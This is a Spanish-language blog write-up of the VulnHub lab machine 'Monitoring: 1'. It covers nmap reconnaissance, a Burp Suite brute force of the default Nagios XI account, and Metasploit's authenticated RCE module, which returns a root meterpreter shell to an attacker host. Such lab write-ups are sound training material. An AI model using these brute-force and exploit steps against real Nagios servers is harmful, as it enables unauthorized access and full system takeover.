---
title: "Writeup Monitoring 1"
header:
  image: /assets/images/posts/monitoring-1/featured_image_monitoring.jpg
  teaser: /assets/images/posts/monitoring-1/featured_image_monitoring.jpg
excerpt_separator: "<!--more-->"
show_date: true
last_modified_at: 2025-12-09T16:20:02-05:00
toc: true
toc_sticky: true
share: true
related: true
categories:
  - writeups
  - Vulnhub
tags:
  - Burp Suite
  - default_user
collection: writeups
---


En este post te llevo paso a paso por la máquina Monitoring: 1, un desafío de nivel fácil disponible en VulnHub. 
Diseñada para quienes desean mejorar en el pentesting
<!--more-->
## Resolucion de la maquina

### Fase de Fingerprinting / Reconocimiento (Reconnaissance):

#### Descubrimiento de IP objetivo en la red

Lanzo `sudo netdiscover -i eth0 -r 192.168.88.0/24` para descubrir los hosts en la red

![alt text](/assets/images/posts/monitoring-1/image.png)

Una vez obtenida la IP de la maquina objetivo la guardo en la variable IP.

```sh
export IP=192.168.88.11
```

Lanzo un escaneo con nmap para ver los puertos que tiene disponible.

```sh
nmap -p- $IP 
```

![alt text](/assets/images/posts/monitoring-1/image-3.png)

```sh
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
389/tcp  open  ldap
443/tcp  open  https
5667/tcp open  unknown
```

Voy a redirigir esta salida a awk y grep para obtener una lista separada por comas para poder exportarla a la variable PORTS y despues usarla en el scaneo detallado.

```sh
nmap -p- $IP | awk '{print $1}' | grep -E '^[0-9]+' | cut -d'/' -f1 | paste -sd, - > puertos.txt
cat puertos.txt   
export PORTS=22,25,80,389,443,5667
```

![alt text](/assets/images/posts/monitoring-1/image-4.png)

Ahora usando la variable PORTS realizo un escaneo en mas profundidad.

```sh
sudo nmap -p$PORTS -sS -sV -sC $IP -O -oA scan_nmap_$IP
```

![alt text](/assets/images/posts/monitoring-1/image-5.png)

#### Descubrimiento de puertos y servicios en el host objetivo

Resultado de la exploracion de los servicios en los puertos detectados:

##### Puerto 22 - SSH

```txt
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b8:8c:40:f6:5f:2a:8b:f7:92:a8:81:4b:bb:59:6d:02 (RSA)
|   256 e7:bb:11:c1:2e:cd:39:91:68:4e:aa:01:f6:de:e6:19 (ECDSA)
|_  256 0f:8e:28:a7:b7:1d:60:bf:a6:2b:dd:a3:6d:d1:4e:a4 (ED25519)
```

##### Puerto 25 - SMTP

```txt
PORT     STATE SERVICE    VERSION
25/tcp   open  smtp       Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-09-08T17:59:00
|_Not valid after:  2030-09-06T17:59:00
|_ssl-date: TLS randomness does not represent time
```

##### Puerto 80 - HTTP

```txt
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Nagios XI
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

##### Puerto 389 - LDAP

```txt
PORT     STATE SERVICE    VERSION
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
```

##### Puerto 443 - HTTPS

```txt
PORT     STATE SERVICE    VERSION
443/tcp  open  ssl/http   Apache httpd 2.4.18 ((Ubuntu))
| ssl-cert: Subject: commonName=192.168.1.6/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
| Not valid before: 2020-09-08T18:28:08
|_Not valid after:  2030-09-06T18:28:08
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.18 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_http-title: Nagios XI
```

##### Puerto 5667

```txt
PORT     STATE SERVICE    VERSION
5667/tcp open  tcpwrapped

```
##### Informacion general de la maquina

```txt
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
```

### Fase de Footprinting / Exploración (Scanning):

#### Exploracion puerto 80

Realizo una exploracion visual de la web que sirve el puerto 80 que me lleva a una pagina de bienvenida que me da el acceso a **Nagios XI**

![alt text](/assets/images/posts/monitoring-1/image-6.png)

Accedo y llego a una pagina donde hay un formulario de acceso y algo de informacion nada relevante.

![alt text](/assets/images/posts/monitoring-1/image-7.png)

Como no conozco este servicio Nagios en nada, consulto en Google si tiene usuario predeterminado. Obtengo de esta forma que el usuario predeterminado es nagiosadmin y que la clave se define en el primer acceso al sitio.

![alt text](/assets/images/posts/monitoring-1/image-12.png)

Si el administrador de la maquina no ha tenido cuidado con este detalle deshabilitando el usuario por defecto es probable que pueda atacarlo con un ataque de fuerza bruta y quizas obtener acceso. 

Para este ataque uso Burp-Suite, defino un ataque de tipo cluster bomb para usar el payload 1 como username y el payload 2 como password. 

![alt text](/assets/images/posts/monitoring-1/image-11.png)

En el payload 1 defino como usuario **nagiosadmin**

![alt text](/assets/images/posts/monitoring-1/image-9.png)

En el payload 2 cargo un diccionario basico de claves **unix_password.txt** 

![alt text](/assets/images/posts/monitoring-1/image-10.png)

A continuacion lanzo el ataque y veo que en la primera de las claves probadas el valor de length es diferente por mucho a los demas. Lo que me indica que es una clave valida.

![alt text](/assets/images/posts/monitoring-1/image-8.png)

Compruebo las credenciales **[nagiosadmin:admin]** y obtengo acceso al sistema Nagios. 

![alt text](/assets/images/posts/monitoring-1/image-13.png)

Una vez dentro veo que el sistema me da informacion sobre su version

![alt text](/assets/images/posts/monitoring-1/image-14.png)

### Explotación

Para explotar el sistema usare metasploit. 

Busco en metasploit vulnerabilidades conocidas para **nagios xi** mediante el comando:

```sh
search nagios xi
```

![alt text](/assets/images/posts/monitoring-1/image-16.png)

Selecciono el modulo nagios_xi_authenticated_rce y defino los valores necesarios despues de consultarlos en options.

```sh
use exploit/linux/http/nagios_xi_authenticated_rce
options
set password admin
set LHOST 192.168.88.3
exploit
```

Esto nos da una sesion de meterpreter.

![alt text](/assets/images/posts/monitoring-1/image-17.png)

Si consulto que usuario tengo en la sesion de meterpreter, me devuelve que tengo el usuario root. 

![alt text](/assets/images/posts/monitoring-1/image-18.png)

Con este usuario puedo acceder a la carpeta /root/ y leer el fichero proof.txt para obtener la flag de solucion de la maquina.




